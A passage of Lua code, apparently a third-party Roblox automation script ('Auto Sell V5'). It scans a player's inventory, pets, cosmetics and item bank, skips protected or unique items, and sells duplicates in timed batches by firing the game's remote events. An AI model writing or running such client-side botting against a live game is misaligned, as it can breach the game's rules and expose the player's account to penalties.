        ["Gear (Weapons + Armor Only)"] = {kind = "gear_weapon_armor", isCosmetic = false},
        ["Weapon Only"] = {kind = "category", category = "Weapon", isCosmetic = false},
        ["Armor Only"] = {kind = "category", category = "Armor", isCosmetic = false},
        ["Necklace Only"] = {kind = "category", category = "Necklace", isCosmetic = false},
        ["Skill Only"] = {kind = "category", category = "Skill", isCosmetic = false},
        ["Pet Only"] = {kind = "category", category = "Pet", isCosmetic = false},
        ["Pet Token Only"] = {kind = "category", category = "Pet Token", isCosmetic = false},
        ["Refined Gem Only"] = {kind = "category", category = "Refined Gem", isCosmetic = false},
        ["Cosmetic: Title (Dupes Only)"] = {kind = "title", isCosmetic = true},
        ["Cosmetic: Weapon Aura (Dupes Only)"] = {kind = "cosmetic", cosmeticType = "WeaponAura", isCosmetic = true},
        ["Cosmetic: Body Aura (Dupes Only)"] = {kind = "cosmetic", cosmeticType = "Aura", isCosmetic = true},
        ["Cosmetic: Weapon Skin (Dupes Only)"] = {kind = "cosmetic", cosmeticType = "WeaponCosmetic", isCosmetic = true},
        ["Cosmetic: Shirt (Dupes Only)"] = {kind = "cosmetic", cosmeticType = "ShirtCosmetic", isCosmetic = true},
        ["Cosmetic: Pants (Dupes Only)"] = {kind = "cosmetic", cosmeticType = "PantsCosmetic", isCosmetic = true},
        ["Cosmetic: All Types (Dupes Only)"] = {kind = "all_cosmetics", isCosmetic = true},
    }

    local KnownHandledCategories = {
        ["Weapon"] = true, ["Armor"] = true, ["Necklace"] = true,
        ["Skill"] = true, ["Pet"] = true, ["Pet Token"] = true,
        ["Refined Gem"] = true, ["Cosmetic"] = true, ["Currency"] = true, ["Title"] = true,
    }

    local KnownCosmeticSubTypes = {
        ["Title"] = true, ["WeaponAura"] = true, ["Aura"] = true,
        ["WeaponCosmetic"] = true, ["ShirtCosmetic"] = true, ["PantsCosmetic"] = true,
    }

    local ItemList = Items:GetItemList()
    for _, Data in pairs(ItemList) do
        if type(Data) == "table" then
            local Cat = Data.Category
            if Cat == "Cosmetic" then
                local SubType = tostring(Data.Type or "Other")
                if not KnownCosmeticSubTypes[SubType] then
                    KnownCosmeticSubTypes[SubType] = true
                    local Label = "Cosmetic: " .. SubType .. " (Dupes Only)"
                    FilterMap[Label] = {kind = "cosmetic", cosmeticType = SubType, isCosmetic = true}
                    table.insert(CategoryOptions, Label)
                end
            elseif type(Cat) == "string" and Cat ~= "" and not KnownHandledCategories[Cat] then
                KnownHandledCategories[Cat] = true
                local Label = Cat .. " Only"
                FilterMap[Label] = {kind = "category", category = Cat, isCosmetic = false}
                table.insert(CategoryOptions, Label)
            end
        end
    end

    local function GetCategorySummaryText()
        local Count = #SelectedCategoriesList
        if Count == 0 then
            return "No Category"
        elseif Count == 1 then
            return SelectedCategoriesList[1]
        elseif Count == 2 then
            return SelectedCategoriesList[1] .. " + " .. SelectedCategoriesList[2]
        else
            return string.format("%s +%d more", SelectedCategoriesList[1], Count - 1)
        end
    end

    local function HasAnyCosmeticSelected()
        for _, Opt in ipairs(SelectedCategoriesList) do
            local Rule = FilterMap[Opt]
            if Rule and Rule.isCosmetic then
                return true
            end
        end
        return false
    end

    local function HasAnyNonCosmeticSelected()
        for _, Opt in ipairs(SelectedCategoriesList) do
            local Rule = FilterMap[Opt]
            if Rule and not Rule.isCosmetic then
                return true
            end
        end
        return false
    end

    local function HasAnyPetSelected()
        for _, Opt in ipairs(SelectedCategoriesList) do
            local Rule = FilterMap[Opt]
            if Rule and Rule.kind == "category" and (Rule.category == "Pet" or Rule.category == "Pet Token") then
                return true
            end
        end
        return false
    end

    -- ==========================================
    -- UID, ITEM INFO, DYE, LEVEL & RARITY READERS
    -- ==========================================
    local function GetItemUID(Item, FallbackKey)
        if typeof(Item) == "Instance" then
            local AttrUid = Item:GetAttribute("ItemUid")
                or Item:GetAttribute("Uid")
                or Item:GetAttribute("UID")
            if type(AttrUid) == "string" and #AttrUid > 0 then
                return AttrUid
            end
        end

        local s1, uid1 = pcall(function() return Items:GetItemUid(Item) end)
        if s1 and type(uid1) == "string" and #uid1 > 0 then
            return uid1
        end

        if type(Item) == "table" then
            local TblUid = Item.ItemUid or Item.uid or Item.UID or Item.Uid
            if type(TblUid) == "string" and #TblUid > 0 then
                return TblUid
            end
        end

        local s2, ref = pcall(function() return Items:ItemRefForRemote(Item) end)
        if s2 and type(ref) == "string" and #ref > 0 then
            return ref
        end

        if type(FallbackKey) == "string" and #FallbackKey > 0 then
            return FallbackKey
        end

        return nil
    end

    local function GetSafeInfo(Item, FallbackKey)
        local Success, Result = pcall(function()
            local ID = Items:GetItemId(Item)
            if not ID and typeof(Item) == "Instance" then
                ID = Item.Name
            elseif not ID and type(Item) == "table" then
                ID = Item.id or Item.Id or Item.ItemId or Item.itemId or Item.Name
            end
            if not ID then return nil end

            local Data = Items:GetItemData(ID)
            if type(Data) ~= "table" then return nil end

            local Rarity = nil
            local sR, rVal = pcall(function() return Items:GetRarity(Item) end)
            if sR and tonumber(rVal) then
                Rarity = tonumber(rVal)
            elseif typeof(Item) == "Instance" and Item:FindFirstChild("Rarity") then
                Rarity = tonumber(Item.Rarity.Value)
            elseif type(Item) == "table" and tonumber(Item.rarity or Item.Rarity) then
                Rarity = tonumber(Item.rarity or Item.Rarity)
            elseif tonumber(Data.Rarity) then
                Rarity = tonumber(Data.Rarity)
            end

            -- Never default unknown rarity to 1!
            if not Rarity then return nil end

            -- PERMANENT HARD BLOCK FOR UNIQUE RARITY (ID 8)
            if Rarity == 8 or tonumber(Data.Rarity) == 8 then
                return nil
            end

            return {
                ID = ID,
                UID = GetItemUID(Item, FallbackKey),
                Data = Data,
                Rarity = Rarity
            }
        end)

        if not Success then return nil end
        return Result
    end

    local function GetDye(Item)
        if typeof(Item) == "Instance" then
            local DyeObj = Item:FindFirstChild("Dye")
            if DyeObj and DyeObj:IsA("ValueBase") and DyeObj.Value ~= nil and tostring(DyeObj.Value) ~= "" then
                return tostring(DyeObj.Value)
            end
            local AttrDye = Item:GetAttribute("Dye") or Item:GetAttribute("dye")
            if AttrDye ~= nil and tostring(AttrDye) ~= "" then
                return tostring(AttrDye)
            end
            return "NONE"
        elseif type(Item) == "table" then
            local TblDye = Item.dye or Item.Dye or Item.color or Item.Color
            if TblDye ~= nil and tostring(TblDye) ~= "" then
                return tostring(TblDye)
            end
            return "NONE"
        end
        return "NONE"
    end

    local function GetItemLevel(Item)
        local s, lvl = pcall(function() return Items:GetLevel(Item) end)
        if s and tonumber(lvl) then
            return tonumber(lvl)
        end
        if typeof(Item) == "Instance" and Item:FindFirstChild("Level") then
            return tonumber(Item.Level.Value) or 1
        elseif type(Item) == "table" and tonumber(Item.level or Item.Level) then
            return tonumber(Item.level or Item.Level)
        end
        return 1
    end

    local function GetSeasonLevel(Item)
        local s, lvl = pcall(function() return Items:GetSeasonalLevel(Item) end)
        if s and tonumber(lvl) then
            return tonumber(lvl)
        end
        return 1
    end

    local function GetCount(Item)
        if typeof(Item) == "Instance" then
            local Count = Item:FindFirstChild("Count")
            if Count then
                return math.max(1, tonumber(Count.Value) or 1)
            end
        elseif type(Item) == "table" then
            return math.max(1, tonumber(Item.count or Item.Count) or 1)
        end
        return 1
    end

    -- ==========================================
    -- 6-LAYER SMART PROTECTION CHECKS (INSTANCE + TABLE)
    -- ==========================================
    local FavoriteTableKeys = {
        "favorite", "Favorite", "favorited", "Favorited",
        "isFavorite", "IsFavorite", "isFavorited", "IsFavorited",
        "starred", "Starred", "locked", "Locked", "sealed", "Sealed"
    }

    local function HasTruthyTableFlag(Tbl, Keys)
        if type(Tbl) ~= "table" then return false end
        for _, K in ipairs(Keys) do
            if Tbl[K] == true then
                return true
            end
        end
        return false
    end

    local function HasGodRollStats(Item)
        if not ProtectGodRolls then return false end

        if typeof(Item) == "Instance" then
            local Stats = Item:FindFirstChild("Stats")
            if not Stats or not Stats:IsA("Folder") then
                return false
            end

            local StatCounts = {}
            local MaxSameStat = 0
            for _, StatChild in ipairs(Stats:GetChildren()) do
                local StatName = StatChild.Name
                StatCounts[StatName] = (StatCounts[StatName] or 0) + 1
                if StatCounts[StatName] > MaxSameStat then
                    MaxSameStat = StatCounts[StatName]
                end
            end
            return MaxSameStat >= MinMatchingStatsToProtect

        elseif type(Item) == "table" then
            local StatsTbl = Item.stats or Item.Stats
            if type(StatsTbl) == "table" then
                local StatCounts = {}
                local MaxSameStat = 0
                for k, v in pairs(StatsTbl) do
                    local StatName = (type(v) == "table" and (v.Name or v.stat or v[1])) or (type(v) == "string" and v) or tostring(k)
                    StatCounts[StatName] = (StatCounts[StatName] or 0) + 1
                    if StatCounts[StatName] > MaxSameStat then
                        MaxSameStat = StatCounts[StatName]
                    end
                end
                if MaxSameStat >= MinMatchingStatsToProtect then
                    return true
                end
            end
        end

        return false
    end

    local function IsItemProtected(Item, Rarity, UID, IgnoreRejectedBlacklist)
        -- 0. Permanent Unique (ID 8) & Blacklist Shields
        if Rarity == 8 then
            return true, "UniqueRarityLock"
        end
        if UID and BankProtectedUIDBlacklist[UID] then
            return true, "BlacklistedSafeUID"
        end
        if not IgnoreRejectedBlacklist and UID and RejectedSellUIDBlacklist[UID] then
            return true, "ServerRejectedUID"
        end

        -- 1. Mastery Reward Check (Usually unsellable)
        if type(Items.ItemIsMasteryReward) == "function" then
            local sM, isMastery = pcall(function() return Items:ItemIsMasteryReward(Item) end)
            if sM and isMastery == true then
                return true, "MasteryReward"
            end
        end

        -- 2. Official Favorite Checks
        local sFav1, isFav1 = pcall(function() return Items:ItemIsFavorited(Item) end)
        if not sFav1 or isFav1 == true then
            return true, "Favorite"
        end

        local sFav2, isFav2 = pcall(function() return Items:ItemIsFavorited(Player, Item) end)
        if sFav2 and isFav2 == true then
            return true, "Favorite"
        end

        if typeof(Item) == "Instance" then
            -- 3. Instance Favorite, Starred, Locked, Sealed Check
            for _, KeyName in ipairs({"Favorite", "Favorited", "Starred", "Locked", "Sealed"}) do
                local Child = Item:FindFirstChild(KeyName)
                if Child and (not Child:IsA("ValueBase") or Child.Value == true) then
                    return true, KeyName
                end
                if Item:GetAttribute(KeyName) == true then
                    return true, KeyName
                end
            end

            -- 4. Socketed Gem Protection
            if ProtectSocketedGems then
                local GemObj = Item:FindFirstChild("Gem")
                if GemObj and (not GemObj:IsA("StringValue") or #GemObj.Value > 0) then
                    return true, "SocketedGem"
                end
            end

            -- 5. Saved Gear Preset Protection (Covers Preset 1, 2, 3, 4+ via children & attributes)
            if ProtectGearPresets then
                for _, Child in ipairs(Item:GetChildren()) do
                    if string.find(Child.Name, "^GearPreset") then
                        return true, "GearPreset"
                    end
                end
                local okAttr, attrs = pcall(function() return Item:GetAttributes() end)
                if okAttr and type(attrs) == "table" then
                    for k, v in pairs(attrs) do
                        if string.find(tostring(k), "^GearPreset") and v then
                            return true, "GearPreset"
                        end
                    end
                end
            end

            -- 6. God-Roll Stat Protection (4x / 5x Same Stat)
            if HasGodRollStats(Item) then
                return true, "GodRollStats"
            end

        elseif type(Item) == "table" then
            if HasTruthyTableFlag(Item, FavoriteTableKeys)
                or HasTruthyTableFlag(Item.data, FavoriteTableKeys)
                or HasTruthyTableFlag(Item.Data, FavoriteTableKeys)
                or HasTruthyTableFlag(Item.meta, FavoriteTableKeys)
                or HasTruthyTableFlag(Item.Meta, FavoriteTableKeys)
                or HasTruthyTableFlag(Item.attributes, FavoriteTableKeys)
                or HasTruthyTableFlag(Item.Attributes, FavoriteTableKeys) then
                return true, "Favorite"
            end

            if ProtectSocketedGems and (Item.gem or Item.Gem) and tostring(Item.gem or Item.Gem) ~= "" then
                return true, "SocketedGem"
            end

            if ProtectGearPresets then
                for k, v in pairs(Item) do
                    if (string.find(tostring(k), "^GearPreset") or k == "presets" or k == "Presets") and v then
                        if type(v) ~= "table" or next(v) ~= nil then
                            return true, "GearPreset"
                        end
                    end
                end
            end

            if HasGodRollStats(Item) then
                return true, "GodRollStats"
            end
        end

        return false, nil
    end

    -- ==========================================
    -- MULTI-CATEGORY & LEVEL/RARITY FILTERING
    -- ==========================================
    local function IsLeveledEquipment(Data)
        local Cat = Data.Category
        return Cat == "Weapon"
            or Cat == "Armor"
            or Cat == "Necklace"
            or Cat == "Skill"
    end

    local function MatchesSingleRule(Data, Rule)
        if not Rule then return false end
        local Kind = Rule.kind

        if Kind == "gear_weapon_armor" then
            return Data.Category == "Weapon" or Data.Category == "Armor"
        elseif Kind == "title" then
            return IsTitleData(Data)
        elseif Kind == "cosmetic" then
            return Data.Category == "Cosmetic"
                and Data.Type == Rule.cosmeticType
                and not IsTitleData(Data)
        elseif Kind == "all_cosmetics" then
            return Data.Category == "Cosmetic"
        elseif Kind == "category" then
            return Data.Category == Rule.category
                or Data.SortCategory == Rule.category
        end

        return false
    end

    local function MatchesCategory(Data)
        for _, OptionName in ipairs(SelectedCategoriesList) do
            if MatchesSingleRule(Data, FilterMap[OptionName]) then
                return true
            end
        end
        return false
    end

    local function IsRarityAndLevelAllowed(Rarity, Level, Data)
        if Rarity == 8 then
            return false
        end
        if RarityConfig[Rarity] ~= true then
            return false
        end
        if UseMaxSellLevelCap and IsLeveledEquipment(Data) then
            if Level > MaxSellLevel then
                return false
            end
        end
        return true
    end

    -- ==========================================
    -- COLLECT CANDIDATES (DEDUPLICATED BY UID)
    -- ==========================================
    local function BuildCandidateEntry(Item, FallbackKey, IgnoreRejectedBlacklist)
        local Info = GetSafeInfo(Item, FallbackKey)
        if not Info then return nil end

        local Data = Info.Data
        local Rarity = Info.Rarity
        local Level = GetItemLevel(Item)

        local AllowUntradeable = (
            Data.Category == "Weapon"
            or Data.Category == "Armor"
            or Data.Category == "Necklace"
            or IsTitleData(Data)
        )
        if not AllowUntradeable then
            local sU, isUntradeable = pcall(function()
                return Items:ItemIsUntradeable(Data)
            end)
            if sU and isUntradeable then
                return nil
            end
        end

        if not MatchesCategory(Data) then
            return nil
        end

        if not IsRarityAndLevelAllowed(Rarity, Level, Data) then
            return nil
        end

        local Protected, ProtectReason = IsItemProtected(Item, Rarity, Info.UID, IgnoreRejectedBlacklist)

        return {
            Item = Item,
            UID = Info.UID,
            ID = Info.ID,
            Data = Data,
            Rarity = Rarity,
            Level = Level,
            SeasonalLevel = (Data.Category == "Skill") and GetSeasonLevel(Item) or 1,
            Count = GetCount(Item),
            Protected = Protected,
            ProtectReason = ProtectReason,
            IsCosmeticItem = (Data.Category == "Cosmetic"),
            IsTitle = IsTitleData(Data),
            Dye = (Data.Category == "Cosmetic") and GetDye(Item) or "NONE",
            Type = Data.Type or "Other"
        }
    end

    local function CollectInventoryCandidates(IgnoreRejectedBlacklist)
        local Collected = {}
        local SeenKeys = {}
        local ProtectedSkipped = 0

        local function Add(Item, Key)
            if not Item then return end
            local UID = GetItemUID(Item, Key)
            local DedupKey = UID or Item
            if SeenKeys[DedupKey] then return end
            SeenKeys[DedupKey] = true

            local Entry = BuildCandidateEntry(Item, Key, IgnoreRejectedBlacklist)
            if Entry then
                if Entry.Protected then
                    ProtectedSkipped = ProtectedSkipped + 1
                end
                table.insert(Collected, Entry)
            end
        end

        local Profile = ProfileSystem:GetProfile(Player)

        -- 1. Inventory Folder (Needed for non-cosmetics and any instance-based cosmetics)
        if HasAnyNonCosmeticSelected() or HasAnyCosmeticSelected() then
            local Inventory = (Profile and Profile:FindFirstChild("Inventory"))
                or Items:GetPlayerItemFolder(Player, "Inventory")
            if Inventory then
                for _, Item in ipairs(Inventory:GetChildren()) do
                    Add(Item, nil)
                end
            end
        end

        -- 2. Pets Folder (Only when Pet Only or Pet Token Only is selected)
        if HasAnyPetSelected() then
            local Pets = (Profile and Profile:FindFirstChild("Pets"))
                or Items:GetPlayerItemFolder(Player, "Pets")
            if Pets then
                for _, Item in ipairs(Pets:GetChildren()) do
                    Add(Item, nil)
                end
            end
        end

        -- 3. Cosmetics Table (Only when any Cosmetic/Title category is selected)
        if HasAnyCosmeticSelected() then
            local Success, Cosmetics = pcall(function()
                return Items:GetTableItems(Player, "Cosmetics")
            end)
            if Success and type(Cosmetics) == "table" then
                for k, Item in pairs(Cosmetics) do
                    Add(Item, k)
                end
            end
        end

        return Collected, ProtectedSkipped
    end

    local function CollectBankCandidates(IgnoreRejectedBlacklist)
        if not HasAnyNonCosmeticSelected() then
            return {}, 0
        end

        local Collected = {}
        local SeenUIDs = {}
        local ProtectedSkipped = 0
        local Now = os.clock()

        for uid, t in pairs(RecentlyPulledUIDs) do
            if Now - t > 4.0 then
                RecentlyPulledUIDs[uid] = nil
            end
        end

        local function AddBankItem(Item, Key)
            if not Item then return end
            if typeof(Item) == "Instance" and Item:IsA("Folder") then return end

            local UID = GetItemUID(Item, Key)
            if not UID or SeenUIDs[UID] or RecentlyPulledUIDs[UID] then
                return
            end
            SeenUIDs[UID] = true

            local Entry = BuildCandidateEntry(Item, UID, IgnoreRejectedBlacklist)
            if Entry and not Entry.IsCosmeticItem then
                if Entry.Protected then
                    ProtectedSkipped = ProtectedSkipped + 1
                end
                table.insert(Collected, Entry)
            end
        end

        local s1, BankTable = pcall(function()
            return Items:GetTableItems(Player, "ItemBank")
        end)
        if s1 and type(BankTable) == "table" then
            for k, v in pairs(BankTable) do
                AddBankItem(v, k)
            end
        end

        local s2, RecContainer = pcall(function()
            return Items:GetRecordContainer(Player, "ItemBank")
        end)
        if s2 and type(RecContainer) == "table" then
            local SubTbl = RecContainer.Items or RecContainer.Records or RecContainer
            if type(SubTbl) == "table" then
                for k, v in pairs(SubTbl) do
                    if type(v) == "table" or typeof(v) == "Instance" then
                        AddBankItem(v, k)
                    end
                end
            end
        end

        local Profile = ProfileSystem:GetProfile(Player)
        local BankFolder = nil
        pcall(function() BankFolder = Items:GetPlayerItemFolder(Player, "ItemBank") end)
        if not BankFolder and Profile then
            BankFolder = Profile:FindFirstChild("ItemBank")
        end
        if BankFolder and typeof(BankFolder) == "Instance" then
            for _, Child in ipairs(BankFolder:GetChildren()) do
                AddBankItem(Child, nil)
            end
        end

        return Collected, ProtectedSkipped
    end

    -- ==========================================
    -- GROUPING & HYBRID SELL LIST BUILDER
    -- (Cosmetics ALWAYS Force Duplicate-Only + Exact Dye Rule!)
    -- ==========================================
    local function GetGroupKey(Entry)
        local BaseKey = tostring(Entry.ID) .. "|R:" .. tostring(Entry.Rarity)
        if Entry.IsTitle then
            return BaseKey .. "|TITLE"
        elseif Entry.Data.Category == "Skill" then
            return BaseKey .. "|SKILL|S:" .. tostring(Entry.SeasonalLevel)
        elseif Entry.Data.Category == "Cosmetic" then
            return BaseKey .. "|COS:" .. tostring(Entry.Type) .. "|DYE:" .. tostring(Entry.Dye)
        end
        return BaseKey
    end

    local function ProcessDuplicateSubset(SubsetEntries, TargetEntries, MetaTable)
        local Groups = {}
        for _, Entry in ipairs(SubsetEntries) do
            local Key = GetGroupKey(Entry)
            Groups[Key] = Groups[Key] or {}
            table.insert(Groups[Key], Entry)
        end

        for _, Group in pairs(Groups) do
            local ProtectedEntries = {}
            local UnprotectedEntries = {}

            for _, Entry in ipairs(Group) do
                if Entry.Protected then
                    table.insert(ProtectedEntries, Entry)
                else
                    table.insert(UnprotectedEntries, Entry)
                end
            end

            if IsLeveledEquipment(Group[1].Data) then
                -- Keep 1 Highest-Level copy, sell lower-level copies
                local HighestProtectedLevel = -math.huge
                for _, Entry in ipairs(ProtectedEntries) do
                    HighestProtectedLevel = math.max(HighestProtectedLevel, Entry.Level)
                end

                table.sort(UnprotectedEntries, function(a, b)
                    return a.Level > b.Level
                end)

                local KeptOne = false
                for _, Entry in ipairs(UnprotectedEntries) do
                    local ShouldKeep = false
                    if not KeptOne and (#ProtectedEntries == 0 or Entry.Level > HighestProtectedLevel) then
                        ShouldKeep = true
                        KeptOne = true
                    end

                    if not ShouldKeep then
                        table.insert(TargetEntries, Entry)
                    end
                end
            else
                -- Cosmetics, Titles, Pets, Tokens: Keep 1 per Exact Dye/Rarity group
                local ProtectedCopies = 0
                for _, Entry in ipairs(ProtectedEntries) do
                    ProtectedCopies = ProtectedCopies + Entry.Count
                end

                local RemainingKeep = (ProtectedCopies > 0) and 0 or 1

                for _, Entry in ipairs(UnprotectedEntries) do
                    local KeepAmount = math.min(Entry.Count, RemainingKeep)
                    RemainingKeep = RemainingKeep - KeepAmount
                    local SellAmount = Entry.Count - KeepAmount

                    if SellAmount > 0 then
                        Entry.SellAmount = SellAmount
                        table.insert(TargetEntries, Entry)
                        if SellAmount < Entry.Count then
                            table.insert(MetaTable, {Entry.Item, SellAmount})
                        end
                    end
                end
            end
        end
    end

    local function BuildSellEntries(Collected)
        local TargetEntries = {}
        local MetaTable = {}

        local CosmeticSubset = {}
        local NonCosmeticSubset = {}

        for _, Entry in ipairs(Collected) do
            if Entry.IsCosmeticItem then
                table.insert(CosmeticSubset, Entry)
            else
                table.insert(NonCosmeticSubset, Entry)
            end
        end

        -- 1. Cosmetics & Titles ALWAYS go through Duplicate-Only + Dye Protection!
        if #CosmeticSubset > 0 then
            ProcessDuplicateSubset(CosmeticSubset, TargetEntries, MetaTable)
        end

        -- 2. Non-Cosmetics follow the user's DuplicateSellEnabled setting
        if #NonCosmeticSubset > 0 then
            if DuplicateSellEnabled then
                ProcessDuplicateSubset(NonCosmeticSubset, TargetEntries, MetaTable)
            else
                for _, Entry in ipairs(NonCosmeticSubset) do
                    if not Entry.Protected then
                        table.insert(TargetEntries, Entry)
                    end
                end
            end
        end

        return TargetEntries, MetaTable
    end

    -- ==========================================
    -- POST-SELL VERIFICATION (ELIMINATES FAKE SPAM!)
    -- ==========================================
    local function SnapshotInventoryCounts()
        local Snapshot = {}
        local Profile = ProfileSystem:GetProfile(Player)

        local function Record(Item, Key)
            if not Item then return end
            local UID = GetItemUID(Item, Key) or Item
            Snapshot[UID] = GetCount(Item)
        end

        local Inv = Profile and Profile:FindFirstChild("Inventory")
        if Inv then
            for _, Child in ipairs(Inv:GetChildren()) do
                Record(Child, nil)
            end
        end

        local Pets = Profile and Profile:FindFirstChild("Pets")
        if Pets then
            for _, Child in ipairs(Pets:GetChildren()) do
                Record(Child, nil)
            end
        end

        if HasAnyCosmeticSelected() then
            local ok, Cos = pcall(function() return Items:GetTableItems(Player, "Cosmetics") end)
            if ok and type(Cos) == "table" then
                for k, v in pairs(Cos) do
                    Record(v, k)
                end
            end
        end

        return Snapshot
    end

    local function SellAndVerify(EntriesList, MetaTable)
        if #EntriesList == 0 then return 0 end

        local SellItems = {}
        local ExpectedKeys = {}

        for _, Entry in ipairs(EntriesList) do
            table.insert(SellItems, Entry.Item)
            local Key = Entry.UID or Entry.Item
            table.insert(ExpectedKeys, {
                Key = Key,
                UID = Entry.UID,
                OldCount = Entry.Count or 1,
                ExpectedSell = Entry.SellAmount or Entry.Count or 1
            })
        end

        LastSellTime = os.clock()
        ItemSelling:SellItem(Player, SellItems, MetaTable)

        -- Wait for server replication, then verify what ACTUALLY sold
        task.wait(VerifySellDelay)
        local PostSnapshot = SnapshotInventoryCounts()

        local ActualSoldTotal = 0

        for _, Check in ipairs(ExpectedKeys) do
            local NewCount = PostSnapshot[Check.Key]
            if NewCount == nil then
                ActualSoldTotal = ActualSoldTotal + Check.OldCount
            elseif NewCount < Check.OldCount then
                ActualSoldTotal = ActualSoldTotal + (Check.OldCount - NewCount)
            else
                -- Server rejected selling this item! Blacklist its UID to prevent infinite retries & spam
                if Check.UID then
                    RejectedSellUIDBlacklist[Check.UID] = true
                end
            end
        end

        return ActualSoldTotal
    end

    -- ==========================================
    -- SMART BANK-TO-SELL AUTO-BRIDGE ENGINE
    -- ==========================================
    local function GetInventoryUsedCount()
        local Profile = ProfileSystem:GetProfile(Player)
        local Inv = Profile and Profile:FindFirstChild("Inventory")
        return Inv and #Inv:GetChildren() or 0
    end

    local function FindLiveInventoryInstanceByUID(TargetUID)
        local Profile = ProfileSystem:GetProfile(Player)
        if not Profile then return nil end

        local Inv = Profile:FindFirstChild("Inventory")
        if Inv then
            for _, Child in ipairs(Inv:GetChildren()) do
                if GetItemUID(Child, nil) == TargetUID then
                    return Child
                end
            end
        end

        local Pets = Profile:FindFirstChild("Pets")
        if Pets then
            for _, Child in ipairs(Pets:GetChildren()) do
                if GetItemUID(Child, nil) == TargetUID then
                    return Child
                end
            end
        end

        return nil
    end

    local function ExecuteBankBridgeSell(BankTargetEntries)
        if #BankTargetEntries == 0 then return false end

        local CurrentBag = GetInventoryUsedCount()
        if CurrentBag >= SafeBagLimitForBridge then
            return false
        end

        -- Step 1: Pull micro-batch from Bank
        local BatchUIDs = {}
        local BatchEntriesByUID = {}
        local PullLimit = math.min(#BankTargetEntries, BankPullBatchSize)

        for i = 1, PullLimit do
            local Entry = BankTargetEntries[i]
            if Entry and Entry.UID and not BankProtectedUIDBlacklist[Entry.UID] and not RejectedSellUIDBlacklist[Entry.UID] then
                table.insert(BatchUIDs, Entry.UID)
                BatchEntriesByUID[Entry.UID] = Entry
                RecentlyPulledUIDs[Entry.UID] = os.clock()
                ItemBankRemote:FireServer(Entry.UID)
                task.wait(0.08)
            end
        end

        if #BatchUIDs == 0 then return false end

        -- Step 2: Wait up to 1.5s for pulled items to appear in Inventory/Pets
        local FoundInstances = {}
        local StartWait = os.clock()

        while os.clock() - StartWait < 1.5 do
            local AllFound = true
            for _, UID in ipairs(BatchUIDs) do
                if not FoundInstances[UID] then
                    local LiveInst = FindLiveInventoryInstanceByUID(UID)
                    if LiveInst then
                        FoundInstances[UID] = LiveInst
                    else
                        AllFound = false
                    end
                end
            end
            if AllFound then break end
            task.wait(0.1)
        end

        -- Step 3: Post-Pull Live Safety Verification (Also blacklists pull-failed Bank UIDs!)
        local VerifiedEntries = {}
        local VerifiedMetaTable = {}

        for _, UID in ipairs(BatchUIDs) do
            local LiveInst = FoundInstances[UID]
            if not LiveInst or not LiveInst.Parent then
                -- Item failed to pull from Bank (Starred / Locked on server) -> Blacklist permanently!
                BankProtectedUIDBlacklist[UID] = true
            else
                local LiveInfo = GetSafeInfo(LiveInst, UID)
                local LiveLevel = GetItemLevel(LiveInst)

                local StillValid = LiveInfo ~= nil
                    and LiveInfo.Rarity ~= 8
                    and MatchesCategory(LiveInfo.Data)
                    and IsRarityAndLevelAllowed(LiveInfo.Rarity, LiveLevel, LiveInfo.Data)

                local LiveProtected = true
                if StillValid then
                    LiveProtected = IsItemProtected(LiveInst, LiveInfo.Rarity, UID, false)
                end

                if not StillValid or LiveProtected then
                    -- Rescue God-Roll / Gem / Favorite item and return it straight to Bank!
                    BankProtectedUIDBlacklist[UID] = true
                    if AutoReturnIfProtected then
                        task.spawn(function()
                            task.wait(0.15)
                            ItemBankRemote:FireServer(UID)
                        end)
                    end
                else
                    local OrigEntry = BatchEntriesByUID[UID]
                    local LiveCount = GetCount(LiveInst)
                    local EntryObj = {
                        Item = LiveInst,
                        UID = UID,
                        Count = LiveCount,
                        SellAmount = (OrigEntry and OrigEntry.SellAmount and OrigEntry.SellAmount < LiveCount) and OrigEntry.SellAmount or LiveCount
                    }
                    table.insert(VerifiedEntries, EntryObj)
                    if EntryObj.SellAmount < LiveCount then
                        table.insert(VerifiedMetaTable, {LiveInst, EntryObj.SellAmount})
                    end
                end
            end
        end

        -- Step 4: Sell & Verify actual sale count before notifying!
        if #VerifiedEntries > 0 then
            local ActualSold = SellAndVerify(VerifiedEntries, VerifiedMetaTable)
            if ActualSold > 0 then
                ShowGlassNotification(
                    string.format("Bank Sold %d Item(s)", ActualSold),
                    string.format("%s | Queue Left: %d", GetCategorySummaryText(), math.max(0, #BankTargetEntries - #BatchUIDs)),
                    Color3.fromRGB(255, 145, 65),
                    3.0
                )
                return true
            end
        end

        return false
    end

    -- ==========================================
    -- MASTER EXECUTION CYCLE
    -- ==========================================
    local function RunAutoSell(IsManualPreview)
        if IsRunningCycle and not IsManualPreview then return end
        IsRunningCycle = true

        local Success, Err = pcall(function()
            -- 1. Manual Preview Scan
            if IsManualPreview then
                local InvCollected, InvProtected = CollectInventoryCandidates(true)
                local InvTargets = BuildSellEntries(InvCollected)

                local BankCollected, BankProtected = CollectBankCandidates(true)
                local BankTargets = BuildSellEntries(BankCollected)

                ShowGlassNotification(
                    string.format("Inv:%d (Safe:%d) | Bank:%d (Safe:%d)", #InvTargets, InvProtected, #BankTargets, BankProtected),
                    string.format("%s | %s", SellSource, GetCategorySummaryText()),
                    (#InvTargets + #BankTargets > 0) and Color3.fromRGB(255, 180, 50) or Color3.fromRGB(0, 235, 160),
                    3.0
                )
                return
            end

            if not AutoSellEnabled then return end
            if os.clock() - LastSellTime < SellCooldown then return end

            -- 2. Sell From Inventory
            local ShouldCheckInventory = (SellSource == "From Inventory Only")
                or (SellSource == "From Both (Inventory + Bank)")
                or HasAnyCosmeticSelected()

            if ShouldCheckInventory then
                local InvCollected, InvProtected = CollectInventoryCandidates(false)
                local InvTargets, InvMeta = BuildSellEntries(InvCollected)

                if #InvTargets > 0 then
                    local ActualSold = SellAndVerify(InvTargets, InvMeta)
                    if ActualSold > 0 then
                        ShowGlassNotification(
                            string.format("Sold %d Item(s)", ActualSold),
                            string.format("%s | Safe: %d", GetCategorySummaryText(), InvProtected),
                            Color3.fromRGB(0, 235, 160),
                            3.0
                        )
                    end
                    return
                end
            end

            -- 3. Sell From Bank via Auto-Bridge
            local ShouldCheckBank = (SellSource == "From Bank Only (Auto-Bridge)")
                or (SellSource == "From Both (Inventory + Bank)")

            if ShouldCheckBank and HasAnyNonCosmeticSelected() then
                local BankCollected = CollectBankCandidates(false)
                local BankTargets = BuildSellEntries(BankCollected)

                if #BankTargets > 0 then
                    ExecuteBankBridgeSell(BankTargets)
                end
            end
        end)

        if not Success then
            warn("[Auto Sell V5 Error]:", Err)
        end

        IsRunningCycle = false
    end

    -- ==========================================
